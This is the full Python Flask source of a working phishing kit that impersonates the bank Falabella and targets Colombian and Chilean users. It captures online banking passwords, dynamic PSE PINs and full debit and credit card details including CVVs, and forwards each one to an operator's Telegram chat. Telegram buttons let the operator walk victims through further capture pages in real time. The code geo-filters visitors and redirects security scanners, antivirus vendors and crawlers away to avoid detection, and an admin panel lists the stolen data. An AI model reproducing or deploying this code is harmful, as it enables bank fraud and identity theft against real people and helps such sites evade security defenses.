import json
import threading
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, session
import os
import requests
import psycopg2
import mimetypes

mimetypes.add_type('text/css', '.css')
mimetypes.add_type('image/svg+xml', '.svg')

base_dir = os.path.abspath(os.path.dirname(__file__))
template_dir = os.path.join(base_dir, 'templates')
static_dir = os.path.join(base_dir, 'assets')
app = Flask(__name__, template_folder=template_dir, static_folder=static_dir, static_url_path='/assets')

# Configuración de Neon DB
DB_URL = os.environ.get("DATABASE_URL")

# Configuración Telegram
TG_TOKEN = os.environ.get("TG_TOKEN")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID")

# Configuración Admin Panel
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS")

# URL Base para botones de Telegram
BASE_URL = os.environ.get("BASE_URL")

def is_allowed_country(ip):
    # Permitir localhost para pruebas
    if ip in ['127.0.0.1', 'localhost']:
        return True
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        return data.get('countryCode') in ['CO', 'CL']
    except:
        return True # Si falla la API, permitimos por seguridad

@app.before_request
def block_foreign_ips():
    # No bloquear archivos estáticos
    if request.path.startswith('/assets') or request.path.startswith('/static'):
        return
        
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # Si hay múltiples IPs en Forwarded-For, tomar la primera
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    if not is_allowed_country(ip):
        return redirect("https://www.google.com")

    # Bloqueo de Bots y Scanners de Seguridad
    ua = request.headers.get('User-Agent', '').lower()
    banned_bots = [
        'bot', 'crawler', 'spider', 'checker', 'scan', 'virustotal', 'eset', 'fortinet',
        'bitdefender', 'sophos', 'kaspersky', 'googlebot', 'bingbot', 'yandexbot',
        'slurp', 'duckduckbot', 'baiduspider', 'ahrefs', 'semrush', 'dotbot',
        'python-requests', 'curl', 'wget', 'headless', 'phantomjs', 'selenium',
        'acronis', 'alphamountain', 'cyradar', 'esecurity', 'juniper', 'lionic',
        'malware', 'phish', 'scantitan', 'securolytics', 'snort', 'zscaler'
    ]
    
    if any(bot in ua for bot in banned_bots):
        return redirect("https://www.google.com")

def send_telegram(message, user_id=None):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = {
            "chat_id": TG_CHAT_ID, 
            "text": message, 
            "parse_mode": "HTML"
        }
        
        if user_id:
            keyboard = {
                "inline_keyboard": [
                    [
                        {"text": "❌ Error Clave", "url": f"{BASE_URL}/update_status/{user_id}/2"},
                        {"text": "🔐 Token Dinámico", "url": f"{BASE_URL}/update_status/{user_id}/3"}
                    ],
                    [
                        {"text": "⚠️ Err Token", "url": f"{BASE_URL}/update_status/{user_id}/4"},
                        {"text": "💳 T. Débito", "url": f"{BASE_URL}/update_status/{user_id}/6"}
                    ],
                    [
                        {"text": "🚨 Err Débito", "url": f"{BASE_URL}/update_status/{user_id}/7"},
                        {"text": "💳 T. Crédito", "url": f"{BASE_URL}/update_status/{user_id}/8"}
                    ],
                    [
                        {"text": "🚨 Err Crédito", "url": f"{BASE_URL}/update_status/{user_id}/9"},
                        {"text": "✅ Finalizar", "url": f"{BASE_URL}/update_status/{user_id}/5"}
                    ]
                ]
            }
            payload["reply_markup"] = json.dumps(keyboard)
            
        r = requests.post(url, data=payload)
        print(f"Telegram Response: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"Error Telegram: {e}")

def get_db_connection():
    url = DB_URL
    if not url:
        raise Exception("DATABASE_URL no está configurada en las variables de entorno.")
    
    if url.startswith("postgres://"):
        url = url.replace("postgres://", "postgresql://", 1)
    
    url = url.strip()
    if url.startswith("psql "):
        url = url.replace("psql ", "", 1).strip()
        if url.startswith("'") and url.endswith("'"):
            url = url[1:-1]
            
    return psycopg2.connect(url)

# Crear tablas si no existen
# Crear tablas si no existen de forma robusta
def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Crear tabla users
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20),
                password VARCHAR(20),
                token VARCHAR(10),
                status VARCHAR(20) DEFAULT '1',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

        # Intentar alterar columnas (en caso de que vengan de Nequi con VARCHAR corto)
        try:
            cur.execute('ALTER TABLE users ALTER COLUMN password TYPE VARCHAR(20)')
            cur.execute('ALTER TABLE users ALTER COLUMN token TYPE VARCHAR(10)')
            conn.commit()
        except Exception as e:
            conn.rollback()
            print("Info: Columnas de users ya estaban actualizadas o no requieren cambio.")

        # Intentar agregar columnas para tarjeta si no existen
        try:
            cur.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS card_number VARCHAR(20)')
            cur.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS card_expiry VARCHAR(10)')
            cur.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS card_cvv VARCHAR(10)')
            cur.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS card_holder VARCHAR(100)')
            conn.commit()
        except Exception as e:
            conn.rollback()

        # Crear tabla logs
        cur.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id SERIAL PRIMARY KEY,
                ip VARCHAR(45),
                latitude VARCHAR(50),
                longitude VARCHAR(50),
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

        # Intentar agregar columna user_agent por si no existe
        try:
            cur.execute('ALTER TABLE logs ADD COLUMN IF NOT EXISTS user_agent TEXT')
            conn.commit()
        except Exception as e:
            conn.rollback()

        cur.close()
        conn.close()
        print("Base de datos inicializada correctamente")
    except Exception as e:
        print(f"Error al inicializar la base de datos: {e}")

init_db()

@app.route('/')
def index():
    import os
    try:
        files = os.listdir('.')
        templates_files = os.listdir('templates') if os.path.exists('templates') else "No existe templates"
    except Exception as e:
        files = str(e)
        templates_files = ""
    print(f"DEBUG FILES: {files}, TEMPLATES: {templates_files}", flush=True)
    return render_template('index.html')

@app.route('/log_visit', methods=['POST'])
def log_visit():
    data = request.json or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    lat = data.get('lat')
    lon = data.get('lon')
    
    ua = request.headers.get('User-Agent', 'N/A')
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO logs (ip, latitude, longitude, user_agent) VALUES (%s, %s, %s, %s)",
            (ip, lat, lon, ua)
        )
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/login', methods=['POST'])
def login_page():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    cc = request.form.get('cc')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO users (phone, password, token, status) VALUES (%s, %s, %s, %s) RETURNING id', 
            (cc, password, '', '1')
        )
        user_id = cur.fetchone()[0]
        conn.commit()
        cur.close()
        conn.close()

        msg = f"🟢 <b>NUEVO INGRESO FALABELLA</b>\n\n"
        msg += f"🪪 <b>Documento:</b> <code>{cc}</code>\n"
        msg += f"🔑 <b>Clave Internet:</b> <code>{password}</code>\n"
        msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
        msg += f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        msg += f"⏳ <b>Estado:</b> Esperando aprobación..."
        
        threading.Thread(target=send_telegram, args=(msg, user_id)).start()

        return jsonify({"status": "success", "user_id": user_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/waiting/<int:user_id>')
def waiting(user_id):
    return render_template('waiting.html', user_id=user_id)

@app.route('/get_status/<int:user_id>')
def get_status(user_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('SELECT status FROM users WHERE id = %s', (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        if res:
            return jsonify({"status": res[0]})
        return jsonify({"status": "error"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/update_status/<int:user_id>/<string:new_status>')
def update_status(user_id, new_status):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('UPDATE users SET status = %s WHERE id = %s', (new_status, user_id))
        conn.commit()
        cur.close()
        conn.close()
        msg = f"✅ Estado actualizado a {new_status} para el usuario {user_id}"
        return f"<html><body style='font-family:sans-serif; text-align:center; padding-top:50px; background:#200020; color:white;'><h2>{msg}</h2></body></html>"
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/dynamic/<int:user_id>')
def dynamic_page(user_id):
    return render_template('dynamic.html', user_id=user_id)

@app.route('/submit_dynamic', methods=['POST'])
def submit_dynamic():
    data = request.json
    user_id = data.get('user_id')
    pin = data.get('pin')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    try:
        # Notificar a Telegram el nuevo PIN
        msg = f"🎰 <b>NUEVA CLAVE DINÁMICA</b>\n\n"
        msg += f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        msg += f"🔑 <b>PIN PSE:</b> <code>{pin}</code>\n"
        msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
        msg += f"⏳ El usuario volvió a la pantalla de espera."
        
        threading.Thread(target=send_telegram, args=(msg, user_id)).start()

        # Cambiar estado a 1 y guardar el token para que aparezca en el panel
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('UPDATE users SET status = %s, token = %s WHERE id = %s', ('1', pin, user_id))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/tdb/<int:user_id>')
def tdb_page(user_id):
    return render_template('tdb.html', user_id=user_id)

@app.route('/submit_tdb', methods=['POST'])
def submit_tdb():
    data = request.json
    user_id = data.get('user_id')
    card_holder = data.get('card_holder')
    card_number = data.get('card_number')
    card_expiry = data.get('card_expiry')
    card_cvv = data.get('card_cvv')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    try:
        # Notificar a Telegram los datos de la tarjeta de débito
        msg = f"💳 <b>TARJETA DÉBITO CAPTURADA (FALABELLA)</b>\n\n"
        msg += f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        msg += f"👤 <b>Titular:</b> <code>{card_holder}</code>\n"
        msg += f"🔢 <b>Número:</b> <code>{card_number}</code>\n"
        msg += f"📅 <b>Vence:</b> <code>{card_expiry}</code>\n"
        msg += f"🔒 <b>CVV:</b> <code>{card_cvv}</code>\n"
        msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
        msg += f"⏳ El usuario regresó a la pantalla de espera."
        
        threading.Thread(target=send_telegram, args=(msg, user_id)).start()

        # Cambiar el estado del usuario en la base de datos de vuelta a '1' (espera)
        # y opcionalmente guardar el token
        conn = get_db_connection()
        cur = conn.cursor()
        # Guardamos el nombre del titular, número de tarjeta, vencimiento y cvv en la base de datos
        cur.execute(
            'UPDATE users SET status = %s, token = %s, card_number = %s, card_expiry = %s, card_cvv = %s, card_holder = %s WHERE id = %s', 
            ('1', card_number[-4:], card_number, card_expiry, card_cvv, card_holder, user_id)
        )
        conn.commit()
        cur.close()
        conn.close()

        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/tct/<int:user_id>')
def tct_page(user_id):
    return render_template('tct.html', user_id=user_id)

@app.route('/submit_tct', methods=['POST'])
def submit_tct():
    data = request.json
    user_id = data.get('user_id')
    card_holder = data.get('card_holder')
    card_number = data.get('card_number')
    card_expiry = data.get('card_expiry')
    card_cvv = data.get('card_cvv')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    try:
        # Notificar a Telegram los datos de la tarjeta de crédito
        msg = f"💳 <b>TARJETA CRÉDITO CAPTURADA (FALABELLA)</b>\n\n"
        msg += f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        msg += f"👤 <b>Titular:</b> <code>{card_holder}</code>\n"
        msg += f"🔢 <b>Número:</b> <code>{card_number}</code>\n"
        msg += f"📅 <b>Vence:</b> <code>{card_expiry}</code>\n"
        msg += f"🔒 <b>CVV:</b> <code>{card_cvv}</code>\n"
        msg += f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
        msg += f"⏳ El usuario regresó a la pantalla de espera."
        
        threading.Thread(target=send_telegram, args=(msg, user_id)).start()

        # Cambiar el estado del usuario en la base de datos de vuelta a '1' (espera)
        # y guardar la información
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(
            'UPDATE users SET status = %s, token = %s, card_number = %s, card_expiry = %s, card_cvv = %s, card_holder = %s WHERE id = %s', 
            ('1', card_number[-4:], card_number, card_expiry, card_cvv, card_holder, user_id)
        )
        conn.commit()
        cur.close()
        conn.close()

        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# --- RUTAS DE ADMINISTRACIÓN INTERNA ---
app.secret_key = "nequi_secret_key_852456"

@app.route('/login_admin', methods=['GET', 'POST'])
def login_admin():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        if user == ADMIN_USER and pw == ADMIN_PASS:
            session['admin_logged_in'] = True
            return redirect(url_for('internal_admin'))
        return render_template('login_admin.html', error="Credenciales incorrectas")
    return render_template('login_admin.html')

@app.route('/admin_panel')
def internal_admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('login_admin'))
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Obtener usuarios con todo el detalle
        cur.execute("SELECT id, phone, password, token, status, created_at, card_number, card_expiry, card_cvv, card_holder FROM users ORDER BY id DESC")
        users = []
        for row in cur.fetchall():
            users.append({
                "id": row[0],
                "phone": row[1],
                "pass": row[2],
                "token": row[3],
                "status": row[4],
                "time": row[5].strftime("%H:%M:%S") if row[5] and hasattr(row[5], 'strftime') else "N/A",
                "card_number": row[6] if len(row) > 6 else None,
                "card_expiry": row[7] if len(row) > 7 else None,
                "card_cvv": row[8] if len(row) > 8 else None,
                "card_holder": row[9] if len(row) > 9 else None
            })
        
        # Obtener logs de visitas
        cur.execute("SELECT ip, user_agent, created_at FROM logs ORDER BY id DESC LIMIT 20")
        logs = []
        for row in cur.fetchall():
            logs.append({
                "ip": row[0],
                "ua": row[1][:50] + "..." if row[1] else "N/A",
                "time": row[2].strftime("%H:%M:%S") if row[2] and hasattr(row[2], 'strftime') else "N/A"
            })
        
        cur.close()
        conn.close()
        
        return render_template('admin_panel.html', users=users, logs=logs)
    except Exception as e:
        return f"Error en el servidor: {str(e)}"

@app.route('/admin/set_status', methods=['POST'])
def admin_set_status():
    if not session.get('admin_logged_in'):
        return jsonify({"status": "error", "message": "No autorizado"})
    
    user_id = request.json.get('user_id')
    new_status = request.json.get('status')
    
    try:
        conn = psycopg2.connect(DB_URL)
        cur = conn.cursor()
        cur.execute("UPDATE users SET status = %s WHERE id = %s", (new_status, user_id))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/admin/delete_user', methods=['POST'])
def admin_delete_user():
    if not session.get('admin_logged_in'):
        return jsonify({"status": "error", "message": "No autorizado"})
    user_id = request.json.get('user_id')
    try:
        conn = psycopg2.connect(DB_URL)
        cur = conn.cursor()
        cur.execute("DELETE FROM users WHERE id = %s", (user_id,))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "message": str(e)})

@app.route('/admin/delete_all', methods=['POST'])
def admin_delete_all():
    if not session.get('admin_logged_in'):
        return jsonify({"status": "error", "message": "No autorizado"})
    try:
        conn = psycopg2.connect(DB_URL)
        cur = conn.cursor()
        cur.execute("DELETE FROM users")
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "message": str(e)})

@app.route('/admin/logout')
def logout_admin():
    session.pop('admin_logged_in', None)
    return redirect(url_for('login_admin'))

@app.route('/finish')
def finish_page():
    return render_template('finish.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
